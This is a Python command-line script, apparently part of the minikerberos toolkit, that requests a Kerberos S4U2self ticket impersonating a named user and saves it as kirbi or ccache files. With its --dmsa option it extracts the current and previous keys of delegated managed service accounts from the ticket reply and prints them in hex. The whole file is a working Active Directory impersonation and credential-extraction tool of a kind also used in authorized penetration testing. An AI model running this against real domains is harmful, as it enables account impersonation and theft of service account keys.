import logging
import asyncio

from minikerberos import logger
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.common.constants import KerberosSecretType
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.kirbi import Kirbi
from minikerberos.protocol.external.ticketutil import get_KRBKeys_From_TGSRep
from minikerberos.protocol.encryption import Enctype


async def getS4U2self(kerberos_url, spn, targetuser, kirbifile = None, ccachefile = None, is_dmsa = False):
	cu = KerberosClientFactory.from_url(kerberos_url)
	client = cu.get_client()
	service_spn = KerberosSPN.from_spn(spn)
	target_user = KerberosSPN.from_upn(targetuser)
	
	if cu.secret_type != KerberosSecretType.CCACHE:
		logger.debug('Getting TGT')
		await client.get_TGT()
		logger.debug('Getting S4Uself')
		tgs, encTGSRepPart, key = await client.S4U2self(target_user, service_spn, is_dmsa=is_dmsa)
	else:
		logger.debug('Getting TGS via TGT from CCACHE')
		for kirbi in client.credential.ccache.get_all_tgt_kirbis():
			try:
				logger.info('Trying to get SPN with %s' % kirbi.get_username())
				ccred_test = KerberosCredential.from_kirbi(kirbi.to_hex(), encoding='hex')
				client = cu.get_client_newcred(ccred_test)
				tgs, encTGSRepPart, key = await client.S4U2self(target_user, service_spn, is_dmsa=is_dmsa)
				logger.info('Sucsess!')
				break
			except Exception as e:

				logger.debug('This ticket is not usable it seems Reason: %s' % e)
				continue
	
	if ccachefile is not None:
		client.ccache.to_file(ccachefile)
		print('Ticket stored in ccache file %s' % ccachefile)
	
	kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
	print(str(kirbi))
	if kirbifile is not None:
		kirbi.to_file(kirbifile)
	
	if is_dmsa:
		dmsa_pack = get_KRBKeys_From_TGSRep(encTGSRepPart)
		print('\ndMSA current keys found in TGS:')
		for current_key in dmsa_pack['current-keys']:
			print("%s: %s" % (Enctype.get_name(current_key['keytype']), current_key['keyvalue'].hex()))
		print('\ndMSA previous keys found in TGS (including keys of preceding managed accounts):')
		for previous_key in dmsa_pack['previous-keys']:
			print("%s: %s" % (Enctype.get_name(previous_key['keytype']), previous_key['keyvalue'].hex()))

	logging.info('Done!')


def main():
	import argparse
	
	parser = argparse.ArgumentParser(description='Gets an S4U2self ticket impersonating given user', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	parser.add_argument('--dmsa', help='Account to impersonate is a dMSA', action='store_true')
	parser.add_argument('--kirbi', help='kirbi file to store the TGS ticket in, otherwise kirbi will be printed to stdout')
	parser.add_argument('--ccache', help='ccache file to store the TGT ticket in')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('kerberos_url', help='Machine account credentials in kerberos URL format.')
	parser.add_argument('spn', help='the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER\'S HOSTNAME MUST BE USED, NOT IP!!!')
	parser.add_argument('targetuser', help='')
	
	args = parser.parse_args()
	if args.verbose == 0:
		logger.setLevel(logging.WARNING)
	elif args.verbose == 1:
		logger.setLevel(logging.INFO)
	else:
		logger.setLevel(1)

	asyncio.run(getS4U2self(args.kerberos_url, args.spn, args.targetuser, args.kirbi, args.ccache, args.dmsa))
	
	
if __name__ == '__main__':
	main()